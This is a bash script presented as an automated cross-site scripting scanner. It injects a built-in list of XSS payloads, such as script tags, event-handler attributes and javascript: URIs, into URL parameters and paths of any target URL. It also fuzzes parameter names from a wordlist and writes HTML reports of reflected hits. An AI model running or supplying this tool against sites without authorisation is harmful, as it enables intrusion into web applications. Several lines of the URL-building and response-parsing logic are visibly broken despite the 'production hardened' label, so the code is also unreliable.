#!/bin/bash

# XSS Hunter - Automated Cross-Site Scripting Vulnerability Scanner
# Usage: ./xss_hunter.sh <target_url> [wordlist] [limit]
# Example: ./xss_hunter.sh "https://target.com/search?q=test" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 100

set -euo pipefail

TARGET_URL="${1:?Missing target_url parameter (must contain parameter like ?q=)}"
WORDLIST="${2:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}"
LIMIT="${3:-100}"

# Validate LIMIT
if ! [[ "$LIMIT" =~ ^[0-9]+$ ]] || [ "$LIMIT" -le 0 ]; then
    echo "Error: LIMIT must be a positive integer" >&2
    exit 1
fi

# Colors for output
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly NC='\033[0m'  # No color

# XSS Payloads (polyglot + context-specific)
readonly -a XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert(1)>"
    "javascript:alert(1)"
    "<svg onload=alert(1)>"
    "<iframe src=javascript:alert(1)>"
    "<details open ontoggle=alert(1)>"
    "javascript:alert(1)//"
    "\"'><script>alert(1)</script>"
    "'><script>alert(1)</script>"
    "\"><svg onload=alert(1)>"
    "data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoKQ=="
    "vbscript:msgbox(1)"
    "<body onload=alert(1)>"
    "';alert(1);//"
    "\"><script>alert(1)</script>"
)

# Reflection patterns to check for XSS vulnerability reflections in responses
readonly -a REFLECTION_PATTERNS=(
    "alert\(1\)" "alert\('XSS'\)" "onerror=alert" "onload=alert" 
    "<script>" "<svg " "<iframe " "javascript:alert"
)

echo -e "${BLUE}XSS Hunter Starting...${NC}"
echo -e "${YELLOW}Target: ${TARGET_URL}${NC}"
echo -e "${YELLOW}Payloads: ${#XSS_PAYLOADS[@]} | Wordlist limit: ${LIMIT}${NC}\n"

# Extract parameter name safely for reporting
PARAM_NAME=$(echo "$TARGET_URL" | sed -n 's/.*[?&]\([^=]*\)=.*/\1/p')
[[ -z "$PARAM_NAME" ]] && PARAM_NAME="unknown"

# Check for jq tool (required for URL encoding)
if ! command -v jq &> /dev/null; then
    echo "Error: jq is required for URL encoding. Install with: apt install jq" >&2
    exit 1
fi

# Create output directory
mkdir -p xss_responses

# Function to test XSS payload (production hardened)
test_xss() {
    local payload="$1"
    local base_url="$2"
    local payload_id="$3"
    
    printf "${PURPLE}[%s] Testing: %s...${NC}\n" "$payload_id" "${payload:0:50}"
    
    # URL encode payload safely
    encoded_payload=$(printf '%s\n' "$payload" | jq -sRr @uri 2>/dev/null)
    
    # Build full URL correctly (preserve original params, replace value)
    if [[ "$base_url" == *"="* ]]; then
        # Replace existing parameter value
        full_url=$(echo "$base_url" | sed "s/\([?&]${PARAM_NAME}=[^&]*\)/\1${encoded_payload}/")
    else
        # Append if no params
        if [[ "$base_url" == *\?* ]]; then
            full_url="${base_url}&${encoded_payload}"
        else
            full_url="${base_url}?${encoded_payload}"
        fi
    fi
    
    # Make HTTP request with timeout and error handling
    IFS=$'\n' read -r -d '' body http_code <<<"$(curl -s -w "\nHTTPSTATUS:%{http_code}" \
        -H "User-Agent: Mozilla/5.0 (XSS-Hunter)" \
        -H "Accept: text/html,application/xhtml+xml" \
        --max-time 10 \
        --connect-timeout 5 \
        "$full_url" 2>/dev/null || echo -e "CURLError\n000")"
    
    # Extract status code
    http_code="${http_code#HTTPSTATUS:}"
    [[ "$http_code" == "CURLError" ]] && http_code="000"
    
    # Skip non-200 responses
    [[ "$http_code" != "200" ]] && return 1
    
    # Check for reflection patterns case-insensitively
    local reflected=false
    for pattern in "${REFLECTION_PATTERNS[@]}"; do
        if echo "$body" | grep -qiF "$pattern"; then
            reflected=true
            break
        fi
    done
    
    if [[ "$reflected" == true ]]; then
        local timestamp=$(date '+%Y%m%d_%H%M%S')
        local filename="xss_responses/xss_${payload_id}_${timestamp}.html"
        
        printf "${GREEN}[XSS HIT] Payload %s -> HTTP %s${NC}\n" "$payload_id" "$http_code"
        printf "${RED}[SAVED] %s${NC}\n" "$filename"
        
        # Generate HTML evidence report
        cat > "$filename" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>XSS Evidence - Payload ${payload_id}</title>
    <style>body{font-family:monospace;}</style>
</head>
<body>
    <h1>✅ XSS CONFIRMED</h1>
    <p><strong>Target URL:</strong> <a href="$full_url">$full_url</a></p>
    <p><strong>Parameter:</strong> $PARAM_NAME</p>
    <p><strong>Payload:</strong> $payload</p>
    <p><strong>Encoded:</strong> $encoded_payload</p>
    <p><strong>HTTP Status:</strong> $http_code</p>
    <p><strong>Timestamp:</strong> $(date)</p>
    <hr>
    <h3>Raw Response (reflections found):</h3>
    <pre style="background:#f5f5f5;padding:20px;">$(echo "$body" | sed 's/&/\&amp;/g' | sed ':a;N;$!ba;s/\n/\\n/g')</pre>
</body>
</html>
EOF
        
        return 0
    fi
    
    return 1
}

# Phase 1: Direct Parameter Testing (all payloads)
echo -e "\n${BLUE}=== Phase 1: Direct Parameter Testing (%d payloads) ===${NC}\n" "${#XSS_PAYLOADS[@]}"
for ((i=1; i<=${#XSS_PAYLOADS[@]}; i++)); do
    test_xss "${XSS_PAYLOADS[$((i-1))]}" "$TARGET_URL" "P1-$i"
done

# Phase 2: Common Parameter Discovery (top 5 payloads for speed)
echo -e "\n${BLUE}=== Phase 2: Common Parameter Discovery ===${NC}"
readonly -a COMMON_PARAMS=("q" "search" "query" "s" "keyword" "term" "name" "id" "redirect" "url")
for param in "${COMMON_PARAMS[@]}"; do
    printf "\n${YELLOW}Testing ?%s=...${NC}\n" "$param"
    for ((i=1; i<=5; i++)); do
        test_xss "${XSS_PAYLOADS[$((i-1))]}" "${TARGET_URL%?*}\?${param}=" "P2-${param}-$i"
    done
done

# Phase 3: Wordlist Fuzzing (top LIMIT params, 3 payloads each)
if [[ -f "$WORDLIST" && -r "$WORDLIST" ]]; then
    echo -e "\n${BLUE}=== Phase 3: Wordlist Fuzzing (top ${LIMIT} params) ===${NC}"
    param_count=0
    while IFS= read -r param_candidate || [[ -n "$param_candidate" ]]; do
        # Skip empty lines and comments
        [[ -z "$param_candidate" || "$param_candidate" =~ ^[[:space:]]*# ]] && continue
        
        param_candidate=$(echo "$param_candidate" | sed 's/[[:space:]]*$//')
        ((param_count++))
        [[ $param_count -gt $LIMIT ]] && break
        
        printf "\n${YELLOW}[%d/%d] ?%s=...${NC}\n" "$param_count" "$LIMIT" "$param_candidate"
        
        for ((i=1; i<=3; i++)); do
            test_xss "${XSS_PAYLOADS[$((i-1))]}" "${TARGET_URL%?*}\?${param_candidate}=" "P3-${param_count}-$i"
        done
    done < "$WORDLIST"
else
    echo -e "\n${YELLOW}Wordlist not found/skipped: $WORDLIST${NC}"
fi

# Phase 4: Path Injection Testing
echo -e "\n${BLUE}=== Phase 4: Path Injection Testing ===${NC}"
readonly -a PATH_INJECTIONS=("/search/" "/results/" "/profile/" "/user/" "/api/")
base_path="${TARGET_URL%/ *}"
for path in "${PATH_INJECTIONS[@]}"; do
    test_xss "<script>alert(1)</script>" "${base_path}${path}" "P4-path"
done

echo -e "\n${GREEN}=== XSS Hunt Complete ===${NC}"
echo -e "${BLUE}Check xss_responses/ for confirmed hits (.html files)${NC}"
ls -la xss_responses/ 2>/dev/null || echo "No XSS hits found."
